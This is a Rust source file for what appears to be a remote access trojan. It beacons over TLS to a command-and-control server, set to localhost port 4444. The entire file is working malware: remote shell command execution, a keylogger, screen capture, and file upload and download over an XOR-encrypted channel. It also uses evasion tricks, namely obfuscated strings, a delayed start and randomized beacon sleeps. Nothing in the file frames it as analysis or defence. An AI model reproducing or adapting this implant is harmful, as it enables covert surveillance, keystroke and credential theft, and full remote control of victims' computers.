use obfstr::obfstr as o; 
use rand::Rng;
use rustls::{ClientConnection, StreamOwned, RootCertStore};
use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::Command;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;
use screenshots::Screen;
use rdev::{listen, Event, EventType};
use image::ImageEncoder;
use std::fs;
use std::env;
use std::path::Path;
lazy_static::lazy_static! {
    static ref KEY_LOGS: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(Vec::new()));
    static ref KEYLOGGER_ACTIVE: Arc<Mutex<bool>> = Arc::new(Mutex::new(false));
}
const C2_DOMAIN: &str = "localhost";  
const C2_PORT: u16 = 4444; 
const SERVER_CERT: &[u8] = include_bytes!("server.crt");
fn random_sleep() {
    let secs = rand::thread_rng().gen_range(5..15); 
    thread::sleep(Duration::from_secs(secs));
}
fn get_tls_stream() -> Option<StreamOwned<ClientConnection, TcpStream>> {
    let mut root_store = RootCertStore::empty();
    let mut reader = std::io::BufReader::new(SERVER_CERT);
    let certs = rustls_pemfile::certs(&mut reader).filter_map(|x| x.ok()).collect::<Vec<_>>();
    for cert in certs {
         let _ = root_store.add(cert);
    }
    let config = rustls::ClientConfig::builder()
        .with_root_certificates(root_store)
        .with_no_client_auth();
    let server_name = C2_DOMAIN.try_into().unwrap();
    let conn = ClientConnection::new(Arc::new(config), server_name).ok()?;
    TcpStream::connect(("127.0.0.1", C2_PORT)).ok()
        .map(|stream| StreamOwned::new(conn, stream))
}
fn xor_encrypt_decrypt(data: &[u8], key: u8) -> Vec<u8> {
    data.iter().map(|b| b ^ key).collect()
}
fn start_keylogger() {
    if *KEYLOGGER_ACTIVE.lock().unwrap() {
        return;
    }
    *KEYLOGGER_ACTIVE.lock().unwrap() = true;
    thread::spawn(|| {
        if let Err(_) = listen(callback) {
            *KEYLOGGER_ACTIVE.lock().unwrap() = false;
        }
    });
}
fn callback(event: Event) {
    if !*KEYLOGGER_ACTIVE.lock().unwrap() {
        return;
    }
    if let EventType::KeyPress(key) = event.event_type {
        let mut logs = KEY_LOGS.lock().unwrap();
        logs.push(format!("{:?}", key));
    }
}
fn handle_screenshot(stream: &mut impl Write, key: u8) {
    let screens = Screen::all().unwrap_or_default();
    if screens.is_empty() {
        let zero = 0u32.to_be_bytes();
        let enc_zero = xor_encrypt_decrypt(&zero, key);
        let _ = stream.write_all(&enc_zero);
        return;
    }
    if let Ok(image) = screens[0].capture() {
        let mut buffer = Vec::new();
        if image::codecs::png::PngEncoder::new(&mut buffer)
            .write_image(image.as_raw(), image.width(), image.height(), image::ExtendedColorType::Rgba8)
            .is_ok()
        {
            let len = buffer.len() as u32;
            let len_bytes = len.to_be_bytes();
            let enc_len = xor_encrypt_decrypt(&len_bytes, key);
            let _ = stream.write_all(&enc_len);
            let enc_data = xor_encrypt_decrypt(&buffer, key);
            let _ = stream.write_all(&enc_data);
            return;
        }
    }
    let zero = 0u32.to_be_bytes();
    let enc_zero = xor_encrypt_decrypt(&zero, key);
    let _ = stream.write_all(&enc_zero);
}
fn execute_shell_command(command: &str) -> Vec<u8> {
    let output = if cfg!(target_os = "windows") {
        Command::new(o!("cmd"))
            .args(&[o!("/C"), command])
            .output()
    } else {
        Command::new(o!("sh"))
            .arg(o!("-c"))
            .arg(command)
            .output()
    };
    match output {
        Ok(out) => [out.stdout, out.stderr].concat(),
        Err(_) => o!("Command failed\r\n").as_bytes().to_vec(),
    }
}

fn handle_cd(path: &str) -> Vec<u8> {
    let new_path = Path::new(path);
    if env::set_current_dir(&new_path).is_ok() {
        let cwd = env::current_dir().unwrap_or_default();
        format!("Changed directory to {}\r\n", cwd.display()).into_bytes()
    } else {
        o!("Failed to change directory\r\n").as_bytes().to_vec()
    }
}

fn handle_upload(key: u8, path: &str, reader: &mut impl Read) -> Vec<u8> {
    // Protocol:
    // 1. Receive 4 bytes size (Encrypted)
    // 2. Receive Data (Encrypted)
    // 3. Write to path
    let mut len_buf = [0u8; 4];
    if reader.read_exact(&mut len_buf).is_err() {
        return o!("Upload failed: Connection error\r\n").as_bytes().to_vec();
    }
    let dec_len_bytes = xor_encrypt_decrypt(&len_buf, key);
    let size = u32::from_be_bytes(dec_len_bytes.try_into().unwrap_or([0; 4]));
    
    let mut data = vec![0u8; size as usize];
    if reader.read_exact(&mut data).is_err() {
        return o!("Upload failed: Data read error\r\n").as_bytes().to_vec();
    }
    
    let dec_data = xor_encrypt_decrypt(&data, key);
    
    match fs::write(path, dec_data) {
        Ok(_) => format!("Uploaded {} bytes to {}\r\n", size, path).into_bytes(),
        Err(e) => format!("Upload failed: {}\r\n", e).into_bytes(),
    }
}

fn handle_download(stream: &mut impl Write, key: u8, path: &str) {
    // Protocol:
    // 1. Check file existence/read
    // 2. Send Size (Encrypted)
    // 3. Send Data (Encrypted)
    match fs::read(path) {
        Ok(data) => {
            let len = data.len() as u32;
            let len_bytes = len.to_be_bytes();
            let enc_len = xor_encrypt_decrypt(&len_bytes, key);
            let _ = stream.write_all(&enc_len);
            
            let enc_data = xor_encrypt_decrypt(&data, key);
            let _ = stream.write_all(&enc_data);
        },
        Err(_) => {
            // Send 0 size to indicate failure
            let zero = 0u32.to_be_bytes();
            let enc_zero = xor_encrypt_decrypt(&zero, key);
            let _ = stream.write_all(&enc_zero);
        }
    }
}
fn main() {
    #[cfg(windows)]
    unsafe {
        windows::Win32::Foundation::SetConsoleCtrlHandler(None, true);
    }
    thread::sleep(Duration::from_secs(30)); 
    loop {
        if let Some(mut stream) = get_tls_stream() {
            let xor_key: u8 = 0xAB; 
            let mut buffer = [0; 2048];
            loop {
                match stream.read(&mut buffer) {
                    Ok(0) => break,
                    Ok(n) => {
                        let encrypted_cmd = &buffer[..n];
                        let cmd_bytes = xor_encrypt_decrypt(encrypted_cmd, xor_key);
                        let command = String::from_utf8_lossy(&cmd_bytes).trim().to_string();
                        let response = match command.as_str() {
                            s if s == o!("screenshot") => {
                                handle_screenshot(&mut stream, xor_key);
                                continue;
                            }
                            s if s == o!("keylogger_start") => {
                                start_keylogger();
                                o!("Keylogger started\r\n").as_bytes().to_vec()
                            }
                            s if s == o!("keylogger_stop") => {
                                *KEYLOGGER_ACTIVE.lock().unwrap() = false;
                                o!("Keylogger stopped\r\n").as_bytes().to_vec()
                            }
                            s if s == o!("keylogger_dump") => {
                                let mut logs = KEY_LOGS.lock().unwrap();
                                let data = logs.join(" ");
                                logs.clear();
                                format!("{}\r\n", data).into_bytes()
                            }
                            s if s == o!("quit") => break,
                            s if s.starts_with("cd ") => {
                                let path = s[3..].trim();
                                handle_cd(path)
                            }
                            s if s.starts_with("upload ") => {
                                let path = s[7..].trim();
                                handle_upload(xor_key, path, &mut stream)
                            }
                            s if s.starts_with("download ") => {
                                let path = s[9..].trim();
                                handle_download(&mut stream, xor_key, path);
                                continue;
                            }
                            _ => execute_shell_command(&command),
                        };
                        let encrypted_resp = xor_encrypt_decrypt(&response, xor_key);
                        if stream.write_all(&encrypted_resp).is_err() {
                            break;
                        }
                    }
                    Err(_) => break,
                }
            }
        }
        random_sleep();
    }
}
